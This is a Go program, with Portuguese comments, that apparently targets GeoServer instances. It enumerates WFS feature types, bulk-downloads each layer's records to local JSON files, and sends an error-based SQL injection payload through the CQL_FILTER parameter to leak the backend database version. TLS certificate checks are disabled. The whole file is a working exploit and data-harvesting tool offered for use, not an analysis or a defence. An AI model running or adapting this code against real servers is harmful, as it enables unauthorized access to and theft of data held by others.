package main

import (
	"crypto/tls"
	"encoding/json"
	"encoding/xml"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"

	"github.com/beevik/etree"
	log "github.com/projectdiscovery/gologger"
)

type WFS_Capabilities struct {
	Version          string `xml:"version,attr"`
	SchemaLocation   string `xml:"schemaLocation,attr"`
	Service          Service
	Capability       Capability
	FeatureTypes     []FeatureType    `xml:"FeatureTypeList>FeatureType"`
	ServiceException ServiceException `xml:"http://www.opengis.net/ogc ServiceException"`
}

type Service struct {
	Name              string `xml:"Name"`
	Title             string `xml:"Title"`
	Abstract          string `xml:"Abstract"`
	Keywords          string `xml:"Keywords"`
	OnlineResource    string `xml:"OnlineResource"`
	Fees              string `xml:"Fees"`
	AccessConstraints string `xml:"AccessConstraints"`
}

type Capability struct {
	Request GetCapabilitiesRequest `xml:"Request"`
}

type GetCapabilitiesRequest struct {
	Get  HTTPGet  `xml:"Get"`
	Post HTTPPost `xml:"Post"`
}

type HTTPGet struct {
	OnlineResource string `xml:"onlineResource,attr"`
}

type HTTPPost struct {
	OnlineResource string `xml:"onlineResource,attr"`
}

type FeatureType struct {
	Name               string             `xml:"Name"`
	Title              string             `xml:"Title"`
	Abstract           string             `xml:"Abstract"`
	Keywords           string             `xml:"Keywords"`
	SRS                string             `xml:"SRS"`
	LatLongBoundingBox LatLongBoundingBox `xml:"LatLongBoundingBox"`
}

type LatLongBoundingBox struct {
	MinX string `xml:"minx,attr"`
	MinY string `xml:"miny,attr"`
	MaxX string `xml:"maxx,attr"`
	MaxY string `xml:"maxy,attr"`
}

type ServiceException struct {
	XMLName xml.Name `xml:"http://www.opengis.net/ogc ServiceException"`
	Text    string   `xml:",chardata"`
}

func main() {
	// Verifica se um argumento de URL foi fornecido
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run main.go <URL>")

	}

	// Obtém a URL fornecida como argumento
	rawURL := os.Args[1]

	// Faz o parse da URL
	parsedURL, err := url.Parse(rawURL)
	if err != nil {
		log.Error().Msgf("%s", err)

	}

	// Cria um cliente HTTP com configurações padrão
	client := &http.Client{}

	// Verifica se o esquema da URL é HTTPS
	if parsedURL.Scheme == "https" {
		// Cria um transporte TLS com verificação de certificado desabilitada
		transport := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client.Transport = transport
	}

	// Verifica se um proxy foi fornecido como argumento opcional
	if len(os.Args) >= 3 {
		proxyURL, err := url.Parse(os.Args[2])
		if err != nil {
			log.Error().Msgf("%s", err)

		}
		client.Transport.(*http.Transport).Proxy = http.ProxyURL(proxyURL)
	}

	// Constrói a URL da requisição
	requestURL := parsedURL.String() + "/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities"

	// Faz a requisição GET
	response, err := client.Get(requestURL)
	if err != nil {
		log.Error().Msgf("%s", err)

	}

	// Lê o corpo da resposta
	defer response.Body.Close()
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		log.Error().Msgf("%s", err)

	}

	// Cria uma instância vazia da estrutura WFS_Capabilities
	wfsCapabilities := WFS_Capabilities{}

	// Faz o parsing do XML no corpo da resposta
	err = xml.Unmarshal(body, &wfsCapabilities)
	if err != nil {
		log.Error().Msgf("%s", err)

	}

	// Imprime as informações extraídas do XML
	log.Info().Msgf("Schema Location: %s", wfsCapabilities.SchemaLocation)
	log.Info().Msgf("Service Name: %s", wfsCapabilities.Service.Name)
	log.Info().Msgf("Service Online Resource: %s", wfsCapabilities.Service.OnlineResource)

	for _, featureType := range wfsCapabilities.FeatureTypes {
		log.Info().Msgf("Databases Names: %s", featureType.Name)
	}

	fmt.Println(" ")

	log.Info().Msg("Try to Obtaining the database collections")

	for _, featureType := range wfsCapabilities.FeatureTypes {

		// Encode the CQL filter using url.QueryEscape to ensure proper encoding
		err := GetFeatureCollection(parsedURL.String(), featureType.Name, 10)
		if err != nil {
			fmt.Println("Error:", err)
			return
		}

		// Cria um novo documento XML
		doc := etree.NewDocument()

		// Carrega o corpo da resposta no documento XML
		err = doc.ReadFromBytes(body)
		if err != nil {
			continue
		}

		GetDatabaseVersion(parsedURL.String(), featureType.Name)
	}

}

func GetFeatureCollection(endpointURL string, typeName string, maxFeatures int) error {
	// Criar a pasta de saída com base no nome do endpointURL
	// Obter o nome do domínio do endpointURL
	parsedURL, err := url.Parse(endpointURL)
	if err != nil {
		return err
	}
	domain := parsedURL.Host

	// Criar a pasta de saída com base no nome do domínio
	outputFolder := filepath.Join("output", "databases", domain)
	err = os.MkdirAll(outputFolder, 0755)
	if err != nil {
		return err
	}

	// Construa o endpoint com os parâmetros desejados
	endpoint := fmt.Sprintf("/geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=%s&sortOrder=ASC&outputFormat=application/json&maxFeatures=1000", typeName)

	// Crie um cliente HTTP
	client := http.Client{}

	// Faça a requisição GET
	response, err := client.Get(endpointURL + endpoint)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	// Lê o corpo da resposta
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}

	if response.StatusCode != http.StatusOK {
		return fmt.Errorf("unexpected status code: %d", response.StatusCode)
	}

	// Dividir as linhas de JSON
	lines := strings.Split(string(body), "\n")

	// Criar um slice para armazenar os JSONs
	jsonArray := make([]map[string]interface{}, 0)

	// Converter cada linha em uma estrutura JSON
	for _, line := range lines {
		// Pular linhas vazias
		if len(strings.TrimSpace(line)) == 0 {
			continue
		}

		// Converter a linha em uma estrutura JSON
		var jsonData map[string]interface{}
		err := json.Unmarshal([]byte(line), &jsonData)
		if err != nil {
			return err
		}

		// Adicionar o JSON ao array
		jsonArray = append(jsonArray, jsonData)
	}

	// Converter o array de JSONs em JSON único com indentação
	indentedJSON, err := json.MarshalIndent(jsonArray, "", "  ")
	if err != nil {
		return err
	}

	// Salvar o JSON em um arquivo dentro da pasta de saída
	outputFile := filepath.Join(outputFolder, fmt.Sprintf("%s.json", typeName))
	err = ioutil.WriteFile(outputFile, indentedJSON, 0644)
	if err != nil {
		return err
	}

	log.Info().Msgf("Data saved to %s\n", outputFile)

	return nil
}

func GetDatabaseVersion(endpointURL string, typeName string) {
	cqlFilters := []string{
		// "strEquals",
		// "strNotEquals",
		// "strGreaterThan",
		// "strGreaterThanOrEquals",
		// "strLessThan",
		// "strLessThanOrEquals",
		// "strLike",
		// "strILike",
		// "strIsNull",
		// "strIsNotNull",
		// "strIsEmpty",
		// "strIsNotEmpty",
		"strStartsWith",
		"strEndsWith",
		"strContains",
		// "strDoesNotContain",
		// "strPropertyIsNull",
		// "strPropertyIsNotNull",
		// "strPropertyIsEmpty",
		// "strPropertyIsNotEmpty",
		// "bbox",
		// "equals",
		// "disjoint",
		// "touches",
		// "within",
		// "overlaps",
		// "crosses",
		// "intersects",
		// "contains",
		// "dWithin",
		// "beyond",
		// "containsProperly",
		// "coveredBy",
		// "covers",
		// "overlapsProperly",
		// "relate",
		// "dwithin",
		// "beyond",
		// "before",
		// "after",
		// "during",
		// "tequals",
		// "toverlaps",
		// "tmeets",
		// "tmetby",
		// "tbefore",
		// "tafter",
		// "tduring",
		// "tcovers",
		// "tcoveredby",
		// "tintersects",
		// "tnear",
		// "tnotnear",
		// "tnotoverlaps",
		// "tnottoverlaps",
		// "tnotwithin",
		// "tprecedes",
		// "tprecededBy",
		// "tsucceeds",
		// "tsucceededBy",
	}
	// Define o endpoint base do Geoserver
	baseEndpoint := "/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=%s&CQL_FILTER=%s%%28nome%%2C%%27x%%27%%27%%29+%%3D+true+and+1%%3D%%28SELECT+CAST+%%28%%28SELECT+version%%28%%29%%29+AS+INTEGER%%29%%29+--+%%27%%29+%%3D+true"

	for _, cqlFilter := range cqlFilters {
		// Codifica o filtro CQL
		encodedCQLFilter := url.QueryEscape(cqlFilter)
		// Substitui as aspas simples problemáticas ('') no filtro CQL por uma aspa simples seguida por duas aspas simples ('')
		encodedCQLFilter = strings.Replace(encodedCQLFilter, "%27%27", "%27%27%27", -1)

		// Constrói a URL modificada do endpoint substituindo os espaços reservados (%s) pelos valores codificados
		endpoint := fmt.Sprintf(baseEndpoint, typeName, encodedCQLFilter)

		// Faz a requisição GET
		response, err := http.Get(endpointURL + endpoint)
		if err != nil {
			fmt.Println("Erro na requisição:", err)
			continue
		}
		defer response.Body.Close()

		// Lê o corpo da resposta
		body, err := ioutil.ReadAll(response.Body)
		if err != nil {
			fmt.Println("Erro ao ler o corpo da resposta:", err)
			continue
		}

		if response.StatusCode == http.StatusOK {

			wfsFeature := WFS_Capabilities{}

			// Faz o parsing do XML no corpo da resposta
			err = xml.Unmarshal(body, &wfsFeature)
			if err != nil {
				continue
			}

			// Find the index of the error message
			index := strings.Index(wfsFeature.ServiceException.Text, "ERROR: invalid input syntax for integer")

			// If the error message is found, find the start and end positions of the line
			if index != -1 {
				start := strings.LastIndex(wfsFeature.ServiceException.Text[:index], "\n") + 1
				end := strings.Index(wfsFeature.ServiceException.Text[index:], "\n")
				if end == -1 {
					end = len(wfsFeature.ServiceException.Text)
				} else {
					end += index
				}

				// Extract the error line
				errorLine := wfsFeature.ServiceException.Text[start:end]

				// Print the error line
				log.Info().Msgf("Database Version: %s", errorLine[96:])
				break
			}
		}
	}
}
